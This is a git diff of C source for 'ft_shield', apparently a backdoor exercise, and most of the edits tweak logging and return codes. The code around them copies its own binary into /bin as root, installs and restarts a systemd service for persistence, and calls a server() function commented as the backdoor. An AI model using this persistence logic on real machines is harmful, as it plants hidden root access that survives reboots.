@@ -50,7 +50,7 @@ int daemonize()
 			return -1;
 		}
 		chmod(SYSTEMD_PATH"ft_shield.service", 755);
-		syslog(LOG_INFO, "systemd starting service\n");
+		syslog(LOG_INFO, "systemd: starting service\n");
 		system("systemctl stop ft_shield");
 		system("systemctl daemon-reload");
 		system("systemctl start ft_shield");
@@ -61,6 +61,7 @@ int daemonize()
 	}
 }
 
+// unused
 int get_parent()
 {
 	pid_t ppid = getppid();
@@ -71,7 +72,7 @@ int get_parent()
 	{
 		char parent_proc[256];
 		fgets(parent_proc, sizeof(parent_proc), f);
-		syslog(LOG_INFO, "parent process: %s\n", parent_proc);
+		syslog(LOG_DEBUG, "parent process: %s\n", parent_proc);
 		fclose(f);
 		if (strncmp(parent_proc, "systemd", 7) == 0) return 1;
 		if (strncmp(parent_proc, "init", 4) == 0) return 2;
@@ -87,18 +88,12 @@ int get_parent()
 bool is_systemd()
 {
 	if (getenv("INVOCATION_ID"))
+	{
+		syslog(LOG_INFO, "current process is recognized as systemd\n");
 		return true;
+	}
 	return false;
 }
-
-//  TO DO
-//
-//  [ ] remove dependancy of EXE_PATH - get rid of manually pointing the a.out file
-//   - use /proc/self/exe?
-//  [ ] sysvinit
-//  [ ] describe in detail about get_parent and is_systemd functions in git commit
-
-
 
 int main(int argc, char **argv)
 {
@@ -110,16 +105,17 @@ int main(int argc, char **argv)
 		printf("root permission required\n");
 		return (-1);
 	}
-	openlog("ft_shield", LOG_PID | LOG_CONS, LOG_USER);
+	openlog("ft_shield", LOG_PID | LOG_CONS, LOG_USER); // LOG_PERROR for stdout
 	len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
 	if (len != -1)
 	{
 		exec_path[len] = '\0';
-		syslog(LOG_INFO, "exec path: %s\n", exec_path);
+		syslog(LOG_DEBUG, "exec path: %s\n", exec_path);
 	}
 	else
 	{
 		syslog(LOG_ERR, "readlink failed\n");
+		return -1;
 	}
 	// syslog(LOG_INFO, "/proc/self/exe: %s", exec_path);
 	if (!is_systemd())
@@ -128,12 +124,12 @@ int main(int argc, char **argv)
 		if (duplicate(exec_path) < 0) // copy binary to /bin directory
 		{
 			syslog(LOG_ERR, "failed to duplicate the program\n");
-			return -1;
+			return -2;
 		}
 		if (daemonize() < 0)
 		{
 			syslog(LOG_ERR, "failed to daemonize service\n");
-			return -2;
+			return -3;
 		}
 	}
 	else
@@ -141,7 +137,7 @@ int main(int argc, char **argv)
 		// backdoor
 		server();
 	}
-	syslog(LOG_INFO, "process end: %s\n", exec_path);
+	syslog(LOG_DEBUG, "process end: %s\n", exec_path);
 	closelog();
 	return (0);
 }
